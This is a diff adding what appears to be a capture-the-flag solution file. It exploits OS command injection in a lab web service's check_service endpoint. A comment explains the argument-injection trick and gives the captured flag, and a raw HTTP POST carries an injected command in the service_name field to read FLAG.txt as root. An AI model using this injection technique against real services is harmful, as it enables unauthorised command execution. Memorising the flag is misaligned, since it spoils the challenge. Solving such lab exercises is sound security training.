@@ -1,0 +1,8 @@
+# OS Command Injection via -t custom argument injection in service_name. Single-quoting allows multi-word commands. Runs as root. Returns flag{e4989f65-575a-4213-a9e7-87a96cb61e87}
+
+POST /check_service HTTP/1.1
+Host: 172.17.0.1:33153
+Content-Type: application/json
+Content-Length: 44
+
+{"service_name": "-t custom 'cat FLAG.txt'"}
